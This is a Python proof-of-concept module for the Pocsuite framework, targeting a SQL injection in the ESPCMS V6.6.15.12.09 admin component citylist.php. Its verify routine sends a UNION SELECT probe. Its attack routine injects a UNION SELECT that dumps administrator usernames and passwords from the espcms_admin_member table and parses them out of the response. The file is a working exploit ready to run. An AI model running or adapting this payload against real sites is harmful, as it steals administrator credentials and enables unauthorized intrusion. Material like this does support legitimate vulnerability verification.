#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re
import urlparse

class TestPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['Gump']
    vulDate = '2015-12-27'
    createDate = '2016-01-29'
    updateDate = '2016-01-29'
    references = ['http://www.wooyun.org/bugs/wooyun-2015-0163605']
    name = 'ESPCMS V6.6.15.12.09 adminsoft\control\citylist.php SQL注入 POC'
    appPowerLink = 'http://www.ecisp.cn/'
    appName = 'ESPCMS'
    appVersion = 'V6.6.15.12.09'
    vulType = 'SQL Injection'
    desc = '''
    ESPCMS V6.6.15.12.09在adminsoft\control\citylist.php对参数处理不当导致SQL注入,需要后台其他管理员权限登录
    '''
    samples = ['']
    # 组件下载地址http://www.ecisp.cn/html/cn/download/

    # 需要后台登录Cookie，可用其他普通管理员账户登录
    def check_argv(self):
        logger.log(CUSTOM_LOGGING.WARNING,u"注意，需要后台登录后的cookie")
        if self.headers['Cookie']:
            # 同时自动设置好User-Agent
            self.headers['User-agent'] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
            logger.log(CUSTOM_LOGGING.WARNING,u"请确保cookie正确")
            return True
        else:
            logger.log(CUSTOM_LOGGING.WARNING,u"请提交后台登录后的cookie")
            return False

    def _attack(self):
        if self.check_argv():
            result = {}
            payload = "?archive=citylist&action=citylist&parentid=-1 UNION select 1,2,concat(char(45,45,45),name,char(45,45,45),password,char(45,45,45)),4,5 FROM espcms_v6.espcms_admin_member"
            vulurl = urlparse.urljoin(self.url,'adminsoft/index.php' + payload)
            resp = req.get(vulurl)
            if resp.status_code == 200:
                # 匹配账户密码
                match_result = re.search(r'---(.+)---(.+)---',resp.content,re.I | re.M)
                if match_result:
                    result['AdminInfo'] = {}
                    result['AdminInfo']['Username'] = match_result.group(1)
                    result['AdminInfo']['Password'] = match_result.group(2)
            return self.parse_attack(result)

    def _verify(self):
        if self.check_argv():
            result = {}
            payload = "?archive=citylist&action=citylist&parentid=-1 UNION select 1,2,concat(floor(rand(0)*2),md5(1)),4,5"
            vulurl = urlparse.urljoin(self.url,'adminsoft/index.php' + payload)
            resp = req.get(vulurl)
            if resp.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in resp.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = urlparse.urljoin(self.url,'adminsoft/index.php')
                result['VerifyInfo']['Payload'] = payload
            return self.parse_attack(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)